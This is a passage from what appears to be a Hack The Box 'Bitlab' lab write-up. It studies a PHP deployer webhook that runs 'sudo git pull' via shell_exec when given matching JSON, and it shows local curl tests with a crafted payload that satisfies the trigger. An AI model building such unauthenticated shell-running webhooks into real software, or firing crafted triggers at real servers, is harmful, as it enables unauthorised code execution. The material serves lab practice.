# Writing curl request for passing JSON data to PHP
The PHP code that we need to `curl` POST the parameters to is
```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";
```
which is found on http://10.10.10.114/deployer. First we need to understand what is the difference between PHP accepting POST input and `php://input` which is [explained here](https://stackoverflow.com/questions/8893574/php-php-input-vs-post). In general `php://input` supports JSON data whereas a [simple **$_POST**](https://www.w3schools.com/php/php_superglobals_post.asp) doesn't. To understand how PHP decodes JSON objects into strings, [read this](https://www.geeksforgeeks.org/how-to-receive-json-post-with-php/).

Let's write a near identical PHP code (test.php) and then get it to `var_dump()` all the JSON data we send it.

```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

echo var_dump($repo) . "<br>";
echo var_dump($event) . "<br>";
echo var_dump($state) . "<br>";
echo var_dump($branch) . "<br>";
```

After reading [this](https://www.tutorialrepublic.com/php-tutorial/php-json-parsing.php), [this](https://www.w3schools.com/js/js_json_objects.asp) and [this](https://www.tutorialspoint.com/what-does-double-question-mark-operator-mean-in-php) I understood how PHP parses the JSON data. So it seems that the nested JSON object it would understand would be

```json
root@Kali:~/HTB/Bitlab# cat data.json 
{
	"project": {
		"name": "project_name"
	},
	"event_type": "my_event",
	"object_attributes": {
		"state": "my_state",
		"target_branch": "my_branch"
	}
	
}
```

We can start a PHP server on Kali with

```shell
root@Kali:~/HTB/Bitlab/php# php -S 127.0.0.1:80 -t .
[Tue Oct 20 14:23:32 2020] PHP 7.4.9 Development Server (http://127.0.0.1:80) started
[Tue Oct 20 14:23:46 2020] 127.0.0.1:57712 Accepted
[Tue Oct 20 14:23:46 2020] 127.0.0.1:57712 [200]: GET /test.php
[Tue Oct 20 14:23:46 2020] 127.0.0.1:57712 Closing
```

To curl POST a data file in JSON format I [followed this](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58) and did this

```shell
root@Kali:~/HTB/Bitlab# curl -d "@data.json" -X POST http://localhost/test.php
string(12) "project_name"
<br>string(8) "my_event"
<br>string(8) "my_state"
<br>string(9) "my_branch"
<br>
```

So it worked, the JSON data was sent in the correct format.  Now let's test code which is near identical to the one on the target (named deploy.php)

```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('echo Triggered!'),"\n";
}
```

Should the `if` statement get triggered we should see an additional **Triggered!** printed out on screen. Now our payload would be

```json
# data.json
{
	"project": {
		"name": "Profile"
	},
	"event_type": "merge_request",
	"object_attributes": {
		"state": "merged",
		"target_branch": "master"
	}
	
}
```

Then we pass it via curl

```shell
root@Kali:~/HTB/Bitlab# curl -d "@data.json" -X POST http://localhost/deploy.php
Triggered!

OK
```

Great it worked!

